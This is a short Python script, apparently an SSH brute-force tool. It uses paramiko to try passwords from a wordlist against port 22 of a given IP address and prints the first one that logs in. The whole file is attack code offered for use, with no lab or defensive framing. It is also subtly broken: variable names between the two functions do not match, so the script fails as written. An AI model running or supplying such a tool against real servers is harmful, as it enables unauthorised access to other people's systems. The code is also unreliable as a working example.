import paramiko

def startAttack(ip, username, password):
    for password in passwords:
        password = password.strip()
        print(f"Trying: {username}:{password}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, port=22, username=username, password=password, timeout=5)
            print(f"[+] Success! Password found: {password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"[-] Error: {e}")

def getInputs():
    ip = input("Enter ip address: ")
    username = input("Enter username: ")
    path = input("Enter password path: ")
    try:
        passwords = open(path)
        startAttack(ip,username, password)
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    getInputs()